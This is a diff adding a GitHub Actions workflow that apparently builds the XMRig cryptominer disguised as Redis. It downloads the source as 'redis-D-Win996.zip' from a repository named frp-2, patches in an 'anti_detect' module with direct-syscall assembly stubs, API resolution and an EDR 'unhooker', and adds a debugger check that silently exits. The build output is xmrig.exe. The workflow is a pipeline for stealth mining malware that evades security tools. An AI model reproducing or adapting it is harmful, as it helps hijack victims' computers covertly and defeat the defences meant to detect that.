@@ -1,0 +1,176 @@
+name: Build on Do win64 noupx
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+      - name: Checkout source code
+        uses: actions/checkout@v3
+
+      # 安装 MSYS2 及所需工具链
+      - name: Set up MSYS2 with GCC, CMake, HWLOC, and make
+        uses: msys2/setup-msys2@v2
+        with:
+          msystem: MINGW64
+          install: mingw-w64-x86_64-gcc mingw-w64-x86_64-cmake mingw-w64-x86_64-hwloc mingw-w64-x86_64-make unzip mingw-w64-x86_64-nasm
+
+      # 安装 curl
+      - name: Install curl
+        shell: msys2 {0}
+        run: pacman -S --noconfirm curl
+
+      # 下载 gcc.zip
+      - name: Download gcc.zip
+        shell: msys2 {0}
+        run: curl -L -o gcc.zip https://raw.githubusercontent.com/Janit8r/frp-2/refs/heads/dev/gcc.zip
+
+      # 下载 redis.zip
+      - name: Download redis.zip
+        shell: msys2 {0}
+        run: curl -L -o redis.zip https://github.com/Janit8r/frp-2/raw/refs/heads/dev/redis-D-Win996.zip
+
+      # 解压 gcc.zip
+      - name: Unzip gcc.zip
+        shell: msys2 {0}
+        run: unzip gcc.zip -d gcc
+
+      # 解压 redis.zip
+      - name: Unzip redis.zip
+        shell: msys2 {0}
+        run: unzip redis.zip -d redis
+
+      # 创建 anti_detect 目录并拷贝我们的代码
+      - name: Create anti_detect directory
+        shell: msys2 {0}
+        run: |
+          mkdir -p redis/redis-D-Win996/src/anti_detect
+          cp -r src/anti_detect/* redis/redis-D-Win996/src/anti_detect/
+
+      # 为NASM创建适配文件
+      - name: Create NASM compatible syscalls.asm
+        shell: msys2 {0}
+        run: |
+          echo 'SECTION .data' > redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    systemCall: dw 0x000' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    syscallAddr: dq 0x0' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo 'SECTION .text' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    global GetPEB' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    global AmmunitionPrepare' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    global GunPrepare' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    global GunFire' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    global GunRuined' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '; 从TEB中获取PEB地址' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo 'GetPEB:' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    mov rax, qword [gs:0x30]  ; 从GS段寄存器读取TEB地址' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    mov rax, qword [rax + 0x60] ; 从TEB中获取PEB' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    ret' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '; 设置系统调用号' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo 'AmmunitionPrepare:' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    mov word [systemCall], cx' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    ret' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '; 保存系统调用指令地址' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo 'GunPrepare:' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    mov rax, qword [syscallAddr]' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    test rax, rax' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    jnz THEEND' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    mov qword [syscallAddr], rcx' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    xor rax, rax' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo 'THEEND:' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    ret' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '; 执行系统调用' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo 'GunFire:' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    mov r10, rcx              ; 第二个参数移动到r10，符合x64调用约定' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    mov eax, 0                ; 清零EAX' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    mov ax, word [systemCall] ; 设置系统调用号' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    test ax, ax' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    jz GunRuined' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    jmp qword [syscallAddr]   ; 通过指针跳转' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    ret' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '; 系统调用失败' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo 'GunRuined:' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    mov rax, 0xFFFFFFFFC0000001 ; 返回STATUS_UNSUCCESSFUL' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+          echo '    ret' >> redis/redis-D-Win996/src/anti_detect/syscalls_nasm.asm
+
+      # 修改CMakeLists.txt添加反调试功能支持
+      - name: Update CMakeLists.txt
+        shell: msys2 {0}
+        run: |
+          cd redis/redis-D-Win996
+          # 添加反调试选项
+          sed -i '/option(WITH_DMI/a option(WITH_ANTI_DETECT     "Enable anti-detection features" ON)' CMakeLists.txt
+          # 添加反调试头文件
+          sed -i '/set(HEADERS/a # 添加反调试和API解析头文件\nif (WITH_ANTI_DETECT AND (WIN32 OR MINGW))\n    set(HEADERS_ANTI_DETECT\n        src/anti_detect/api_resolver.h\n        src/anti_detect/unhooker.h\n        src/anti_detect/structs.h\n        src/anti_detect/asm_exports.h\n        )\n    list(APPEND HEADERS "${HEADERS_ANTI_DETECT}")\nendif()' CMakeLists.txt
+          # 添加反调试源文件
+          sed -i '/set(SOURCES/a # 添加反调试和API解析源文件\nif (WITH_ANTI_DETECT AND (WIN32 OR MINGW))\n    set(SOURCES_ANTI_DETECT\n        src/anti_detect/api_resolver.cpp\n        src/anti_detect/unhooker.cpp\n        )\n    list(APPEND SOURCES "${SOURCES_ANTI_DETECT}")\nendif()' CMakeLists.txt
+          # 添加汇编文件支持
+          sed -i '/if (XMRIG_OS_WIN)/a \    # 添加汇编代码文件\n    if (WITH_ANTI_DETECT)\n        enable_language(ASM_NASM)\n        set(ASM_FILES\n            src/anti_detect/syscalls_nasm.asm\n            )\n        list(APPEND SOURCES_OS ${ASM_FILES})\n    endif()' CMakeLists.txt
+          # 添加反调试宏定义
+          sed -i '/add_definitions(-D__STDC_FORMAT_MACROS/a # 添加反调试和API解析宏定义\nif (WITH_ANTI_DETECT)\n    add_definitions(-DXMRIG_ANTI_DETECT)\nendif()' CMakeLists.txt
+
+      # 修改App.cpp添加反调试支持
+      - name: Update App.cpp
+        shell: msys2 {0}
+        run: |
+          cd redis/redis-D-Win996/src
+          # 添加头文件包含
+          sed -i '/#include "version.h"/a // 添加反调试和API解析功能\n#include "anti_detect/api_resolver.h"' App.cpp
+          # 在App构造函数中初始化API解析器
+          sed -i '/App::App(Process \*process)/a {\n    // 初始化API解析器和反调试\n    ApiResolver::GetInstance();\n    \n    m_controller = std::make_shared<Controller>(process);\n}' App.cpp
+          # 删除原有的构造函数实现
+          sed -i '/App::App(Process \*process)/,/^}$/d' App.cpp
+          # 在exec函数开始添加调试检测
+          sed -i '/int xmrig::App::exec()/a {\n    // 检测调试器\n    if (ApiResolver::GetInstance()->IsDebugged()) {\n        // 静默退出，不显示错误\n        return -1;\n    }' App.cpp
+          # 删除原有的exec函数开头
+          sed -i '/int xmrig::App::exec()/,/^{$/d' App.cpp
+
+      # 创建 build 目录
+      - name: Create build directory in redis
+        shell: msys2 {0}
+        run: mkdir -p redis/redis-D-Win996/build
+
+      # 确保 mingw32-make 已安装
+      - name: Ensure mingw32-make is installed
+        shell: msys2 {0}
+        run: |
+          echo 'Checking for make installation...'
+          if ! command -v mingw32-make &> /dev/null; then
+            echo 'mingw32-make is not installed. Installing...'
+            pacman -S --noconfirm mingw-w64-x86_64-make
+          else
+            echo 'mingw32-make is already installed.'
+          fi
+          mingw32-make --version
+
+      # 运行 CMake 生成 Makefiles
+      - name: Run CMake to generate Makefiles
+        shell: msys2 {0}
+        run: |
+          cd redis/redis-D-Win996/build
+          cmake .. -G "MinGW Makefiles" -Dredis_DEPS=D:/a/frp-2/frp-2/gcc/gcc/x64 -DCMAKE_C_FLAGS='-static' -DCMAKE_CXX_FLAGS='-static' -DBUILD_SHARED_LIBS=OFF -DHWLOC_INCLUDE_DIRS=/mingw64/include -DHWLOC_LIBRARIES=/mingw64/lib/libhwloc.a -DWITH_ANTI_DETECT=ON -DCMAKE_ASM_NASM_COMPILER=nasm
+
+      # 编译项目
+      - name: Build project
+        shell: msys2 {0}
+        run: |
+          cd redis/redis-D-Win996/build
+          mingw32-make
+
+      # 上传构建产物
+      - name: Archive build artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: build-artifacts
+          path: redis/redis-D-Win996/build/xmrig.exe
